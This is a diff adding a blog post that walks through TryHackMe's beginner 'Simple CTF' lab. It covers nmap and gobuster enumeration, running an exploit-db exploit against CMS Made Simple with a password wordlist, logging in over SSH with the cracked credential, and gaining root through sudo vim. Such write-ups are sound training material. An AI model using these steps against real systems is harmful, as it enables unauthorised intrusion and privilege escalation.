@@ -1,0 +1,121 @@
+---
+title: "Simple CTF TryHackMe"
+date: "07-22-2021"
+author: "Reda BELHAJ"
+summary: "Simple CTF is a beginner level boot2root room from TryHackme made by Mr.Seth6797."
+tags: ["TryHackMe", "Ctf", "Writeup"]
+image: "/images/Simple/Simple.png"
+---
+
+## Enumeration
+### Nmap Scan
+The first step of my enumeration was a scan with **nmap**. by the command:
+
+```
+nmap 10.10.198.35 -sC 
+```
+
+```
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-22 13:14 EDT
+Nmap scan report for 10.10.198.35
+Host is up (0.11s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.174.180
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  http
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  EtherNetIP-1
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+
+Nmap done: 1 IP address (1 host up) scanned in 40.71 seconds
+
+```
+
+The “Nmap Output” displayed `2` services running under port 1000 and ssh service running on the higher port.
+
+### Gobuster Scan
+I next decided to run a gobuster scan on the webserver to see if there were any interesting hidden directories, by the command:
+
+```
+gobuster dir -u http://10.10.198.35  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,xml,php
+```
+
+![Gobuster]("/images/Simple/gobuster.png")
+
+## Exploring 
+
+Browsing to ***http://10.10.198.35/simple*** gives us the version of CMS Made Simple:
+
+![Version]("/images/Simple/version.jpg")
+
+I then searched for the cve on [exploit-db](https://www.exploit-db.com/exploits/46635) and found the cve with the exploit:
+
+![CVE]("/images/Simple/cve.jpg")
+
+## Exploiting
+
+Then I run the exploit using python (version 2.7) inside a virtual environment:
+
+```
+python cms_pa.py -u http://10.10.198.35/simple/ -c -w rockyou.txt
+```
+
+![Password]("/images/Simple/password.jpg")
+
+## User Flag
+
+And now I tried to access SSH with the credentials that We found:
+
+```
+mitch@secret
+```
+
+```
+ssh -p 2222 mitch@10.10.198.35
+```
+
+```
+G00d *************
+```
+
+## Root Flag
+
+So now I tried the infamous `sudo -l` comand to privilege escalate the system
+
+```
+sudo -l
+```
+And i found that **mitch** can run vim with root privileges with ***NOPASSWD***
+
+```
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+![SUID]("/images/Simple/suid.jpg")
+
+And now we're root:
+
+```
+W3ll d*****************
+```
